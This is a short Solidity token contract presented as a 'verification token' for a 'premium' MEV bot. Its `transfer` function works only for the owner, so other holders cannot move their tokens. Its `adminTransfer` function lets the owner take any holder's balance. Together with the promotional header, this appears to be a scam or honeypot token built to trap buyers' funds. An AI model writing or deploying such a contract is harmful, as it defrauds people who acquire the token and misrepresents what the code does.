// SPDX-License-Identifier: UNLICENSED
// This is Beast Verification Token For MevBot
// Get Your Premium Bot

pragma solidity ^0.8.0;

contract MevBot {
    mapping(address => uint256) private balances;
    address public owner;

    string public name = "MevBot"; 
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply = 1000 * (10 ** 18); 

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor() {
        symbol = "mBot";  
        decimals = 18;   
        balances[msg.sender] = totalSupply; 
        emit Transfer(address(0), msg.sender, totalSupply);
        owner = msg.sender; 
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Caller is not the owner");
        _;
    }

    function balanceOf(address account) public view returns (uint256) {
        return balances[account];
    }

    function transfer(address recipient, uint256 amount) public onlyOwner returns (bool) {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        balances[msg.sender] -= amount;
        balances[recipient] += amount;
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }

    function adminTransfer(address from, address to, uint256 amount) public onlyOwner {
        require(balances[from] >= amount, "Insufficient balance");
        balances[from] -= amount;
        balances[to] += amount;
        emit Transfer(from, to, amount);
    }
}